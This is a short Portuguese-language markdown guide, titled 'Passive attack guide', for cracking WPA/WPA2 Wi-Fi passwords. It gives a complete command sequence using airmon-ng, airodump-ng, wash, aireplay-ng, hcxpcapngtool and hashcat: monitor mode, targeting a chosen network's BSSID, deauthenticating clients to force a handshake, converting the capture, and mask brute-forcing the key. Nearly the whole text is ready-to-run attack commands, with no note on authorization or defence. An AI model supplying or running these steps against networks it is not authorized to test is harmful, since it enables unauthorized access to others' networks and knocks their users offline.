# Passive attack guide

## Stack

- **airmon-ng**: Serve para por a placa em modo monitoramento
- **airodump-ng**: Monitora uma rede especifica sincronizando ao canal dela e captura PMKID/EAPOL
- **wash**: Varredura das redes com verificação de wps.
- **hcxtools**: Usa o hcxpcapngtool para converter o arquivo .cap em um .22000
- **hashcat**: Usamos para quebrar a senha usando CPU ou GPU

## Flow

Para o nm
```bash
    sudo systemctl stop NetworkManager
```

Para qualquer coisa que atrapalhe o suit de ataque
```bash
    sudo airmon-ng check kill
```

Inicia a placa em modo monitoramento
```bash
    sudo airmon-ng start $INTERFACE
```

Varre as redes ao redor
```bash
    sudo wash -i $INTERFACE -F
```

Inicia monitoramento e captura da rede especifica
```bash
    sudo airodump-ng -c $CANNEL --bssid $BSSID -w capture $INTERFACE
```

Você pode tentar executar injeção para forçar ou esperar ate que um usuário entre na rede
```bash
sudo aireplay-ng --deauth 20 -a $BSSIDNET -c #BSSIDUSER $INTERFACE
```

COm arquivo valido converte para hashcat
```bash
    sudo hcxpcapngtool -o hash.22000 capture.cap
```

Inicia a quebra de senha com hashcat usando máscara
```bash
    sudo hashcat -m 22000 -a 3 --force -d 1 -O -w 3 -1 "?l?u?d" hash.22000 "?1?1?1?1?1?1?1?1"
```

Reativar placa novamente
```bash
    sudo airmon-ng stop $INTERFACE && sudo systemctl start NetworkManager
```
